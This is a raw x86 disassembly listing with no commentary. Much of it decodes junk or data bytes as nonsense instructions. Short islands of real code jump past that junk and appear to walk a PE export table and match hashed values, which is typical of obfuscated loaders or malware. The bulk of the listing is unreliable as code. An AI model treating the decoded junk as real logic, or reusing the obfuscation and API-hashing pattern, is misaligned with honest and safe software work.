  40f028:	or     eax,0x65b14bfa
  40f02d:	(bad)  [ebx+esi*1+0x1e]
  40f031:	adc    eax,0xfb863588
  40f036:	xor    eax,0x203f836a
  40f03b:	lods   eax,DWORD PTR ds:[esi]
  40f03c:	cli    
  40f03d:	lea    ecx,[esi+edi*8]
  40f040:	adc    eax,0x6c09d654
  40f045:	shl    ch,cl
  40f047:	cwde   
  40f048:	mov    cl,0xf7
  40f04a:	repnz out dx,al
  40f04c:	dec    edx
  40f04d:	or     edx,esp
  40f04f:	ss jp  0x40f095
  40f052:	add    ch,dh
  40f054:	push   ecx
  40f055:	scas   al,BYTE PTR es:[edi]
  40f056:	push   es
  40f057:	pop    ebx
  40f058:	and    BYTE PTR [eax],al
  40f05a:	inc    ebp
  40f05b:	jl     0x40f005
  40f05d:	arpl   bx,cx
  40f05f:	jae    0x40f043
  40f061:	sub    edi,DWORD PTR [edx-0x57e0fa59]
  40f067:	arpl   bx,bx
  40f069:	xchg   edi,eax
  40f06a:	aaa    
  40f06b:	xchg   edx,eax
  40f06c:	sbb    BYTE PTR [ebp-0x15],0x1f
  40f070:	jp     0x40f092
  40f072:	ror    DWORD PTR [ecx],1
  40f074:	ret    
  40f075:	and    eax,0x20918c7b
  40f07a:	fisttp QWORD PTR [ebp-0x4cd9ad4c]
  40f080:	ds std 
  40f082:	mov    ss,WORD PTR [ebx]
  40f084:	pop    ebp
  40f085:	fwait
  40f086:	repz (bad) 
  40f088:	cdq    
  40f089:	mov    ah,0xd0
  40f08b:	enter  0xf014,0xd
  40f08f:	xor    eax,0xd768b9c7
  40f094:	push   edx
  40f095:	pop    esp
  40f096:	ror    BYTE PTR [esp+edi*8+0x510e7cfb],1
  40f09d:	vorps  ymm1,ymm4,YMMWORD PTR [ebx-0x41487417]
  40f0a5:	(bad)
  40f0a8:	ja     0x40f083
  40f0aa:	jmp    0xf6ad:0xc41d6a06
  40f0b1:	mov    ds,WORD PTR [ecx+0x5ac30e03]
  40f0b7:	adc    eax,0x2a317938
  40f0bc:	jecxz  0x40f107
  40f0be:	or     al,0xaa
  40f0c0:	mov    dl,0x60
  40f0c2:	out    0x7e,eax
  40f0c4:	inc    edi
  40f0c5:	gs jp  0x40f0d6
  40f0c8:	popf   
  40f0c9:	sbb    dl,dh
  40f0cb:	or     BYTE PTR [edx+eax*2],ch
  40f0ce:	pop    ss
  40f0cf:	sbb    edi,esp
  40f0d1:	pop    edi
  40f0d2:	(bad)  [ecx+0x56]
  40f0d5:	jmp    0xd505:0x16447534
  40f0dc:	loopne 0x40f0cd
  40f0de:	outs   dx,BYTE PTR ds:[esi]
  40f0df:	and    dh,cl
  40f0e1:	mov    cl,0x95
  40f0e3:	xchg   edx,eax
  40f0e4:	(bad)
  40f0e9:	push   edi
  40f0ea:	loop   0x40f14e
  40f0ec:	sti    
  40f0ed:	xor    ch,BYTE PTR [ebx]
  40f0ef:	int    0xcd
  40f0f1:	xchg   DWORD PTR [edx+0x4f],edx
  40f0f4:	in     eax,dx
  40f0f5:	sub    DWORD PTR [ebp-0x56d74a12],0xffffff98
  40f0fc:	sub    ecx,edi
  40f0fe:	add    al,BYTE PTR [ebp-0x70]
  40f101:	cmp    ah,BYTE PTR [esi-0x64]
  40f104:	inc    edi
  40f105:	(bad)  
  40f106:	loopne 0x40f091
  40f108:	cmp    al,0x4e
  40f10a:	cmp    ebx,DWORD PTR ds:0x1b2ec220
  40f110:	and    ebx,DWORD PTR [ebx-0x3b]
  40f113:	call   0x5b04:0xed95ddfd
  40f11a:	scas   eax,DWORD PTR es:[edi]
  40f11b:	out    0xb,eax
  40f11d:	test   BYTE PTR [ecx+0x26],0xe6
  40f121:	push   ebp
  40f122:	jnp    0x40f10c
  40f124:	add    DWORD PTR [eax-0x6c],eax
  40f127:	xchg   bl,ah
  40f129:	fsub   DWORD PTR [edi+0x36]
  40f12c:	icebp  
  40f12d:	fisub  WORD PTR [eax]
  40f12f:	dec    ecx
  40f130:	retf   0x9748
  40f133:	ja     0x40f177
  40f135:	dec    ecx
  40f136:	nop
  40f137:	mov    esp,0x3dfc08fb
  40f13c:	sub    ch,BYTE PTR [ecx-0x48fbcbe3]
  40f142:	add    esp,ecx
  40f144:	mov    bl,dh
  40f146:	mov    ah,0x6f
  40f148:	test   BYTE PTR [esi+0x63ad1ac0],0xe7
  40f14f:	fstp   TBYTE PTR [eax-0x57]
  40f152:	and    ecx,DWORD PTR [edi]
  40f154:	test   BYTE PTR [eax+0x1],bh
  40f157:	add    BYTE PTR [eax],al
  40f159:	mov    eax,DWORD PTR [ebp-0x8]
  40f15c:	jmp    0x40f2c6
  40f161:	lods   eax,DWORD PTR ds:[esi]
  40f162:	ret    0xcc29
  40f165:	jno    0x40f15a
  40f167:	ins    DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   esp,esi
  40f16e:	adc    eax,0xaaa3ce91
  40f173:	jo     0x40f1e5
  40f175:	ret    
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f15f
  40f17a:	inc    esp
  40f17b:	mov    ch,0x39
  40f17d:	dec    esp
  40f17e:	pop    ebp
  40f17f:	fbld   TBYTE PTR [edx-0x5f]
  40f182:	sbb    eax,0x3fa0cca6
  40f187:	jno    0x40f11a
  40f189:	sbb    eax,0x8a1af210
  40f18e:	lahf   
  40f18f:	or     dh,0x63
  40f192:	pop    es
  40f193:	xchg   ecx,eax
  40f194:	sahf   
  40f195:	and    dl,BYTE PTR es:[esi+0xb]
  40f199:	add    eax,0xb41f5314
  40f19e:	out    0x2b,al
  40f1a0:	fucomp st(0)
  40f1a2:	inc    edx
  40f1a3:	jne    0x40f1c4
  40f1a5:	ret    0x1a01
  40f1a8:	shl    BYTE PTR [esi+ebp*4+0x1f7b35f5],0x9e
  40f1b0:	into   
  40f1b1:	mov    edi,0x945ecd30
  40f1b6:	(bad)  
  40f1b7:	aaa    
  40f1b8:	mov    edi,0x6a5fd238
  40f1bd:	fsubr  DWORD PTR [edi]
  40f1bf:	(bad)  
  40f1c0:	mov    DWORD PTR [eax+ecx*8+0x7d73edda],esi
  40f1c7:	(bad)  
  40f1c8:	(bad)  
  40f1c9:	mov    edi,0xda5f5489
  40f1ce:	xchg   esp,eax
  40f1cf:	pop    edx
  40f1d0:	ret    
  40f1d1:	icebp  
  40f1d2:	pushf  
  40f1d3:	jne    0x40f253
  40f1d5:	push   ds
  40f1d6:	dec    edi
  40f1d7:	test   BYTE PTR [eax],dh
  40f1d9:	xchg   edi,eax
  40f1da:	pop    esi
  40f1db:	icebp  
  40f1dc:	jmp    0xc184:0x550a41a7
  40f1e3:	inc    esp
  40f1e4:	stos   BYTE PTR es:[edi],al
  40f1e5:	push   ebx
  40f1e6:	jno    0x40f1ff
  40f1e8:	rep lods al,BYTE PTR ds:[esi]
  40f1ea:	pop    ss
  40f1eb:	rcr    DWORD PTR [ebp-0x40],cl
  40f1ee:	mov    bl,0x6b
  40f1f0:	pop    ds
  40f1f1:	sbb    al,0x6c
  40f1f3:	scas   eax,DWORD PTR es:[edi]
  40f1f4:	or     al,0xc2
  40f1f6:	jae    0x40f219
  40f1f8:	out    0x5,eax
  40f1fa:	aas    
  40f1fb:	jno    0x40f1de
  40f1fd:	xchg   esi,eax
  40f1fe:	xor    eax,0xe8608fa0
  40f203:	lea    esi,[ebp-0x1d263aa4]
  40f209:	lahf   
  40f20a:	mov    WORD PTR [esi],gs
  40f20c:	cmp    DWORD PTR [ecx+0x7],ebx
  40f20f:	les    edx,FWORD PTR [ebx-0x28]
  40f212:	int    0x66
  40f214:	idiv   BYTE PTR [eax-0x5a]
  40f217:	dec    esi
  40f218:	add    ecx,DWORD PTR [ecx+0x21]
  40f21b:	push   esi
  40f21c:	sbb    BYTE PTR fs:[esi-0x14a77987],al
  40f223:	dec    ebp
  40f224:	(bad)  
  40f226:	push   ebp
  40f227:	neg    BYTE PTR [esp+eiz*4+0xe]
  40f22b:	push   eax
  40f22c:	mov    ecx,0x72da0294
  40f231:	jge    0x40f2a0
  40f233:	test   eax,0x1048bbb1
  40f238:	not    DWORD PTR [esi-0x12]
  40f23b:	pop    ss
  40f23c:	xchg   ebx,eax
  40f23d:	div    BYTE PTR [edi-0x2e]
  40f240:	xchg   esp,eax
  40f241:	xor    edi,DWORD PTR ds:0x5a55be4e
  40f247:	ror    BYTE PTR [ebx],0x90
  40f24a:	out    dx,eax
  40f24b:	sub    al,0xce
  40f24d:	push   ds
  40f24e:	gs jbe 0x40f2c2
  40f251:	leave  
  40f252:	out    dx,al
  40f253:	pop    edx
  40f254:	ds leave 
  40f256:	jno    0x40f227
  40f258:	cmp    BYTE PTR [edx+0x5a],dh
  40f25b:	retf   
  40f25c:	mov    DWORD PTR [ebx-0x230ac77a],ebp
  40f262:	push   ebp
  40f263:	xor    ch,ah
  40f265:	xchg   esi,ecx
  40f267:	pusha  
  40f268:	neg    DWORD PTR [esi+0x423be962]
  40f26e:	xchg   BYTE PTR [esi-0x11058f1b],bh
  40f274:	dec    BYTE PTR [ebx]
  40f276:	push   esp
  40f277:	std    
  40f278:	(bad)  
  40f279:	mov    bl,0x31
  40f27b:	sbb    edx,DWORD PTR [eax+ebx*1-0x3082ea10]
  40f282:	punpckhbw mm3,QWORD PTR [ecx+0x19]
  40f286:	(bad)  
  40f287:	ds test eax,0x36703d0
  40f28d:	and    BYTE PTR [ecx-0x6b],ah
  40f290:	ficomp DWORD PTR [eax-0x48955b57]
  40f296:	sub    bl,BYTE PTR [ebx+0x64]
  40f299:	cs mov cl,0x3e
  40f29c:	mov    eax,0x3fc400da
  40f2a1:	pop    esp
  40f2a2:	fidivr WORD PTR [eax]
  40f2a4:	xor    eax,DWORD PTR [ebx]
  40f2a6:	(bad)  
  40f2a7:	dec    ebp
  40f2a8:	xor    eax,0x5c424b03
  40f2ad:	jno    0x40f2ea
  40f2af:	pop    esi
  40f2b0:	out    0xf1,eax
  40f2b2:	(bad)  
  40f2b3:	cld    
  40f2b4:	mov    eax,0xdd439b91
  40f2b9:	(bad)  [edi+0x2f10c4ac]
  40f2bf:	jg     0x40f2d6
  40f2c1:	jo     0x40f2da
  40f2c3:	stc    
  40f2c4:	cmp    ah,0xc7
  40f2c7:	add    BYTE PTR [ecx-0x169fcbe2],cl
  40f2cd:	in     eax,0x4
  40f2cf:	add    BYTE PTR [eax],al
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	rcl    BYTE PTR [edx-0x69],1
  40f2f9:	repnz (bad) 
  40f2fb:	jbe    0x40f2a6
  40f2fd:	jo     0x40f36f
  40f2ff:	ret    
  40f300:	jg     0x40f372
  40f302:	jo     0x40f2a7
  40f304:	xchg   BYTE PTR [ecx+0x72],ah
  40f307:	push   esp
  40f308:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f309:	in     al,dx
  40f30a:	ins    BYTE PTR es:[edi],dx
  40f30b:	jns    0x40f356
  40f30d:	nop
  40f30e:	iret   
  40f30f:	adc    eax,0x29a59962
  40f314:	jmp    0x4adc0d38
  40f319:	and    al,bh
  40f31b:	ret    0x1700
  40f31e:	xchg   esi,eax
  40f31f:	mov    ebx,0x91f65413
  40f324:	adc    ah,ah
  40f326:	sbb    eax,0xb5b40f5
  40f32b:	mov    edi,0xb6a6d0fa
  40f330:	not    DWORD PTR [edi+0x5b3f4eb3]
  40f336:	mov    eax,ds:0x707b1651
  40f33b:	adc    ebx,0xffffff94
  40f33e:	fcomp  DWORD PTR [ebx-0x68]
  40f341:	daa    
  40f342:	mov    edi,0x7382c5ce
  40f347:	jb     0x40f3c7
  40f349:	pop    es
  40f34a:	dec    eax
  40f34b:	xor    BYTE PTR [edi+0x46b00613],cl
  40f351:	in     al,dx
  40f352:	in     al,0xcf
  40f354:	ficom  DWORD PTR [ebx+0x6ffb9518]
  40f35a:	inc    eax
  40f35b:	or     eax,0x2588e3a0
  40f360:	mov    esp,ebx
  40f362:	mov    cl,0xb3
  40f364:	js     0x40f349
  40f366:	xor    eax,0xffd1ae0e
  40f36b:	nop
  40f36c:	sahf   
  40f36d:	enter  0x813,0x9b
  40f371:	sub    edi,DWORD PTR [eax]
  40f373:	add    DWORD PTR [esi-0x4],ebx
  40f376:	sbb    eax,0xdfbb5084
  40f37b:	mov    ebp,0x48bb6e75
  40f380:	stc    
  40f381:	xchg   ecx,eax
  40f382:	je     0x40f402
  40f384:	jno    0x40f345
  40f386:	add    al,0xd3
  40f388:	mov    edx,0xf122133d
  40f38d:	lods   al,BYTE PTR ds:[esi]
  40f38e:	mov    ds:0x32b27632,eax
  40f393:	jecxz  0x40f3fd
  40f395:	ret    0xa590
  40f398:	sub    bh,BYTE PTR [edi]
  40f39a:	js     0x40f352
  40f39c:	jmp    0x40f347
  40f39e:	mov    al,ds:0xd278d473
  40f3a3:	and    eax,edi
  40f3a5:	popf   
  40f3a6:	ins    BYTE PTR es:[edi],dx
  40f3a7:	clc    
  40f3a8:	mov    al,ds:0x3c9b06cd
  40f3ad:	scas   al,BYTE PTR es:[edi]
  40f3ae:	out    dx,eax
  40f3af:	jp     0x40f3fd
  40f3b1:	cdq    
  40f3b2:	das    
  40f3b3:	xor    edi,DWORD PTR [edi+ebx*8+0x51]
  40f3b7:	pop    ebp
  40f3b8:	mov    ebp,edx
  40f3ba:	or     al,0x84
  40f3bc:	cld    
  40f3bd:	loopne 0x40f3b4
  40f3bf:	daa    
  40f3c0:	add    DWORD PTR [ecx+0x3c],ecx
  40f3c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3c4:	in     al,0x79
  40f3c6:	adc    DWORD PTR [ebx],esp
  40f3c8:	cs loope 0x40f3e4
  40f3cb:	les    esi,FWORD PTR [ecx+0x4a9dfb98]
  40f3d1:	push   cs
  40f3d2:	inc    eax
  40f3d3:	fwait
  40f3d4:	jmp    0xf2be393a
  40f3d9:	sub    al,0x5c
  40f3db:	push   edx
  40f3dc:	ds (bad) 
  40f3de:	ins    DWORD PTR es:[edi],dx
  40f3df:	nop
  40f3e0:	mov    ?,WORD PTR [ecx-0x55e7222a]
  40f3e6:	shr    ebp,cl
  40f3e8:	xchg   ecx,eax
  40f3e9:	mul    DWORD PTR [ebx-0x3b9c967d]
  40f3ef:	out    dx,al
  40f3f0:	add    eax,0xe9a7ec72
  40f3f5:	test   edi,edi
  40f3f7:	pop    ebx
  40f3f8:	fild   QWORD PTR [edi+0x1a]
  40f3fb:	scas   eax,DWORD PTR es:[edi]
  40f3fc:	test   al,0xa8
  40f3fe:	pop    ss
  40f3ff:	fstp   TBYTE PTR [ecx+0x76]
  40f402:	or     bl,BYTE PTR [ebp+eiz*8-0x22ba2508]
  40f409:	aam    0x5b
  40f40b:	(bad)  [ecx+edi*8]
  40f40e:	arpl   WORD PTR [eax],ax
  40f410:	jg     0x40f3a7
  40f412:	icebp  
  40f413:	into   
  40f414:	inc    ebx
  40f415:	neg    BYTE PTR [eax+0x6770b633]
  40f41b:	movhps xmm1,QWORD PTR [edi]
  40f41e:	stos   BYTE PTR es:[edi],al
  40f41f:	mov    eax,0xb79470fa
  40f424:	shl    DWORD PTR [edx+0x14],1
  40f427:	jge    0x40f432
  40f429:	(bad)  
  40f42a:	xor    eax,0xcd2c6b24
  40f42f:	and    eax,0xdd5dad70
  40f434:	add    BYTE PTR [edx],bh
  40f436:	mov    dl,0x78
  40f438:	jb     0x40f430
  40f43a:	sub    bh,0x1
  40f43d:	cs daa 
  40f43f:	inc    esp
  40f440:	inc    ebp
  40f441:	mov    ecx,0x88ce3750
  40f446:	jbe    0x40f499
  40f448:	jle    0x40f43d
  40f44a:	retf   
  40f44b:	aas    
  40f44c:	fist   DWORD PTR [edx+0x5b]
  40f44f:	iret   
  40f450:	mov    eax,DWORD PTR [ebp-0x8]
  40f453:	jmp    0x40f5bd
  40f458:	inc    eax
  40f459:	gs ror ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	adc    eax,0x39815e21
  40f469:	mov    bh,0x70
  40f46b:	jo     0x40f430
  40f46d:	jg     0x40f4df
  40f46f:	jo     0x40f441
  40f471:	cld    
  40f472:	xor    DWORD PTR [ebp-0x2fcbdb08],esi
  40f478:	mov    esp,0xd652aa5d
  40f47d:	mov    esp,0xf4ed04c1
  40f482:	adc    ch,bh
  40f484:	out    dx,eax
  40f485:	pop    ecx
  40f486:	out    dx,al
  40f487:	mov    eax,0x90d5b238
  40f48c:	dec    ebp
  40f48d:	(bad)  
  40f48e:	mov    eax,0x7f38e387
  40f493:	push   es
  40f494:	or     cl,BYTE PTR [edi+0x740589c6]
  40f49a:	aam    0x7a
  40f49c:	popf   
  40f49d:	addr16 cld 
  40f49f:	test   BYTE PTR [edi+0xe383675],0xfc
  40f4a6:	cmc    
  40f4a7:	dec    ebp
  40f4a8:	stos   DWORD PTR es:[edi],eax
  40f4a9:	push   edx
  40f4aa:	cwde   
  40f4ab:	rol    BYTE PTR [ebx-0x15],1
  40f4ae:	inc    ecx
  40f4af:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4b1:	sub    DWORD PTR [eax+eax*2+0x63],eax
  40f4b5:	or     ebp,ecx
  40f4b7:	mov    al,ds:0x857d419
  40f4bc:	fild   QWORD PTR [edi-0x11b6c27a]
  40f4c2:	int    0xf
  40f4c4:	mov    bh,0x23
  40f4c6:	mov    edi,0xb6ae6973
  40f4cb:	jge    0x40f52e
  40f4cd:	rol    DWORD PTR [edi-0x5f35eb27],cl
  40f4d3:	mov    DWORD PTR [ebp-0x6d],edi
  40f4d6:	mov    ah,0xb0
  40f4d8:	jg     0x40f4e3
  40f4da:	ss mov ecx,0x661e5ff9
  40f4e0:	daa    
  40f4e1:	in     al,0x8e
  40f4e3:	test   eax,0x9f7be80a
  40f4e8:	jg     0x40f532
  40f4ea:	cmp    edx,0x76
  40f4ed:	or     cl,al
  40f4ef:	fsub   DWORD PTR ds:0x2a532cfa
  40f4f5:	and    eax,DWORD PTR [eax+0x557ccd73]
  40f4fb:	retf   0xc792
  40f4fe:	ds fs adc al,0x54
  40f502:	push   ds
  40f503:	push   esi
  40f504:	das    
  40f505:	mov    bl,0x3a
  40f507:	jbe    0x40f4f6
  40f509:	jo     0x40f527
  40f50b:	cmp    ah,BYTE PTR [esi]
  40f50d:	aad    0xd3
  40f50f:	add    BYTE PTR [ecx+eax*1-0x2f],0x87
  40f514:	fnstenv [ebx+0x5d]
  40f517:	imul   edi,DWORD PTR [esi+eiz*8+0x24f35674],0x2b20719a
  40f522:	fst    DWORD PTR [ebx-0x79]
  40f525:	mov    ch,0x9e
  40f527:	xchg   edx,eax
  40f528:	xor    esi,DWORD PTR [ebp+0x55174188]
  40f52e:	(bad)  
  40f52f:	out    0x71,al
  40f531:	xchg   BYTE PTR [edi+ebx*8+0x52],dl
  40f535:	ja     0x40f536
  40f537:	cmp    eax,0x4c81efb2
  40f53c:	stos   DWORD PTR es:[edi],eax
  40f53d:	mov    ecx,0x144d262c
  40f542:	leave  
  40f543:	push   0xe3beacd3
  40f548:	ja     0x40f4eb
  40f54a:	mov    bl,0xa3
  40f54c:	add    eax,0x557070b6
  40f551:	xor    eax,0x884d6d3d
  40f556:	push   eax
  40f557:	pop    esi
  40f558:	add    dl,al
  40f55a:	and    bl,BYTE PTR [edx-0x55]
  40f55d:	in     al,dx
  40f55e:	test   esp,eax
  40f560:	and    BYTE PTR [edx-0x41de698c],bl
  40f566:	test   al,0x8f
  40f568:	push   ds
  40f569:	or     eax,0x8e1d3c26
  40f56e:	test   BYTE PTR [ebp+0x17],ah
  40f571:	(bad)  
  40f572:	out    dx,al
  40f573:	jne    0x40f581
  40f575:	xchg   ebp,eax
  40f576:	adc    DWORD PTR [ecx+0x130b6084],esi
  40f57c:	loop   0x40f5de
  40f57e:	and    ebx,esi
  40f580:	imul   edx,DWORD PTR [edx-0x2cc88f2],0x36
  40f587:	or     eax,0x17054c1f
  40f58c:	xchg   edi,eax
  40f58d:	rcr    ch,0x6b
  40f590:	dec    edi
  40f591:	jo     0x40f5af
  40f593:	mov    eax,ds:0x4a8da2f
  40f598:	inc    ebp
  40f599:	and    DWORD PTR [edx],ebx
  40f59b:	dec    ecx
  40f59c:	fisub  WORD PTR [edi]
  40f59e:	outs   dx,DWORD PTR ds:[esi]
  40f59f:	mov    eax,ds:0x40814ac0
  40f5a4:	iret   
  40f5a5:	add    DWORD PTR [ecx],esi
  40f5a7:	je     0x40f621
  40f5a9:	les    ebx,FWORD PTR [esi-0x5f59cf6b]
  40f5af:	mov    esi,DWORD PTR [edx-0x1de7fb1]
  40f5b5:	rol    DWORD PTR ds:0x5e6f5e9b,cl
  40f5bb:	clc    
  40f5bc:	pop    ds
  40f5bd:	mov    eax,DWORD PTR [eax]
  40f5bf:	mov    eax,DWORD PTR [eax+0x3c]
  40f5c2:	lea    ecx,[ecx*8+0x78]
  40f5c9:	add    eax,ecx
  40f5cb:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5ce:	mov    ecx,DWORD PTR [ecx]
  40f5d0:	mov    eax,DWORD PTR [eax+ecx*1]
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	fwait
  40f604:	add    bh,BYTE PTR [edi-0x19]
  40f607:	mov    WORD PTR [esi+0x7fc37070],?
  40f60d:	jo     0x40f67f
  40f60f:	ds out dx,eax
  40f611:	xchg   DWORD PTR [eax+ebx*2-0x74fc03e5],esi
  40f618:	jg     0x40f5b9
  40f61a:	leave  
  40f61b:	mov    edi,DWORD PTR [ecx+0xd3a94ca]
  40f621:	push   ecx
  40f622:	push   ebx
  40f623:	daa    
  40f624:	int3   
  40f625:	jb     0x40f66f
  40f627:	in     al,dx
  40f628:	mov    ebp,0x2522fd76
  40f62d:	ins    DWORD PTR es:[edi],dx
  40f62e:	xor    DWORD PTR [ecx-0xf2f5604],eax
  40f634:	(bad)  
  40f635:	das    
  40f636:	test   DWORD PTR [edx],esp
  40f638:	mov    BYTE PTR [esi+0x645c6301],al
  40f63e:	dec    edx
  40f63f:	dec    eax
  40f640:	inc    edx
  40f641:	sub    dh,BYTE PTR [ebp-0x5b12f63b]
  40f647:	mov    ch,0xda
  40f649:	pop    esi
  40f64a:	fld    DWORD PTR ds:0x1ff1381b
  40f650:	retf   
  40f651:	int3   
  40f652:	shl    DWORD PTR ds:0x6532fca0,0xf6
  40f659:	(bad)  
  40f65a:	adc    sp,ax
  40f65d:	cmp    DWORD PTR [ecx+0x69],ecx
  40f660:	pop    ss
  40f661:	aaa    
  40f662:	arpl   WORD PTR [eax],sp
  40f664:	fdiv   QWORD PTR [edi+ebp*1-0x6]
  40f668:	inc    edi
  40f669:	or     eax,0xca3aa911
  40f66e:	adc    edx,DWORD PTR [esp+ecx*2-0x29ec3672]
  40f675:	xchg   ebp,eax
  40f676:	xor    bh,BYTE PTR [esi]
  40f678:	enter  0x833b,0x56
  40f67c:	outs   dx,DWORD PTR ds:[esi]
  40f67d:	daa    
  40f67e:	mov    eax,ds:0x44941141
  40f683:	inc    ecx
  40f684:	cld    
  40f685:	adc    ch,ah
  40f687:	dec    eax
  40f688:	push   esi
  40f689:	fwait
  40f68a:	ror    DWORD PTR [ebp-0x6a],cl
  40f68d:	cwde   
  40f68e:	jo     0x40f698
  40f690:	(bad)  
  40f691:	mov    edi,0x20278085
  40f696:	aas    
  40f697:	mov    ss,WORD PTR [ecx+0x67daa867]
  40f69d:	fisubr DWORD PTR [ebp+0x28]
  40f6a0:	jmp    FWORD PTR [ebx+ebp*4+0x8c152fb]
  40f6a7:	repnz dec eax
  40f6a9:	mov    bl,0xdb
  40f6ab:	cmp    BYTE PTR [esi-0x7511b253],0xb5
  40f6b2:	mov    esi,ss
  40f6b4:	adc    al,0x80
  40f6b6:	mov    BYTE PTR [ebx],bh
  40f6b8:	std    
  40f6b9:	push   ecx
  40f6ba:	inc    ecx
  40f6bb:	xchg   edx,esi
  40f6bd:	jo     0x40f69f
  40f6bf:	ds cs adc eax,0xfbc70dc3
  40f6c6:	int3   
  40f6c7:	mov    eax,ds:0x7207f059
  40f6cc:	jb     0x40f73c
  40f6ce:	cli    
  40f6cf:	sub    cl,BYTE PTR [ecx+0x5a7f8f77]
  40f6d5:	xchg   ebp,eax
  40f6d6:	gs scas eax,DWORD PTR es:[edi]
  40f6d8:	mov    bl,0x3f
  40f6da:	push   ss
  40f6db:	cmp    BYTE PTR [ebx+0x51],dh
  40f6de:	mov    ds:0x4d5722ff,eax
  40f6e3:	lock imul esi,DWORD PTR [ebx],0x2fb6d7ed
  40f6ea:	sahf   
  40f6eb:	popf   
  40f6ec:	jmp    0xf0cc0d4
  40f6f1:	aad    0xd0
  40f6f3:	jecxz  0x40f6d8
  40f6f5:	retf   
  40f6f6:	jno    0x40f679
  40f6f8:	rcr    cl,cl
  40f6fa:	adc    DWORD PTR [ecx+eax*2-0x3a2106b1],ebp
  40f701:	push   esi
  40f702:	jecxz  0x40f763
  40f704:	adc    al,ch
  40f706:	push   ss
  40f707:	jecxz  0x40f763
  40f709:	lods   eax,DWORD PTR ds:[esi]
  40f70a:	lds    edx,FWORD PTR [edi+esi*4]
  40f70d:	pop    ecx
  40f70e:	pop    ecx
  40f70f:	neg    DWORD PTR [edx+edx*1+0x5]
  40f713:	jae    0x40f705
  40f715:	cmc    
  40f716:	push   eax
  40f717:	scas   eax,DWORD PTR es:[edi]
  40f718:	shr    BYTE PTR [esi+0x60cb860],0x75
  40f71f:	mov    WORD PTR [eax-0x3a9c1df1],es
  40f725:	cmp    eax,0xdc11bb02
  40f72a:	push   edi
  40f72b:	lods   eax,DWORD PTR ds:[esi]
  40f72c:	(bad)  
  40f72d:	sub    edx,DWORD PTR [esi]
  40f72f:	outs   dx,DWORD PTR ds:[esi]
  40f730:	push   ecx
  40f731:	das    
  40f732:	mov    DWORD PTR [ebp-0x17848a4a],esi
  40f738:	fld    DWORD PTR [esi]
  40f73a:	out    dx,al
  40f73b:	loopne 0x40f6c9
  40f73d:	mov    ebp,0xe1646cc0
  40f742:	xor    ebp,DWORD PTR [ebx+0x44]
  40f745:	pop    ss
  40f746:	iret   
  40f747:	mov    ebp,0x7a1ec043
  40f74c:	ds data16 ins BYTE PTR es:[edi],dx
  40f74f:	es pop ebx
  40f751:	cdq    
  40f752:	sahf   
  40f753:	outs   dx,BYTE PTR ds:[esi]
  40f754:	loopne 0x40f7c6
  40f756:	push   DWORD PTR [edi+0x409130b5]
  40f75c:	mov    eax,DWORD PTR [ebp-0x8]
  40f75f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f762:	add    ecx,DWORD PTR [eax]
  40f764:	mov    DWORD PTR [ebp-0x24],ecx
  40f767:	mov    eax,DWORD PTR [ebp-0x24]
  40f76a:	mov    ecx,DWORD PTR [ebp-0x8]
  40f76d:	mov    eax,DWORD PTR [eax+0xc]
  40f770:	mov    ecx,DWORD PTR [ecx]
  40f772:	mov    al,BYTE PTR [eax+ecx*1]
  40f775:	add    al,0x37
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
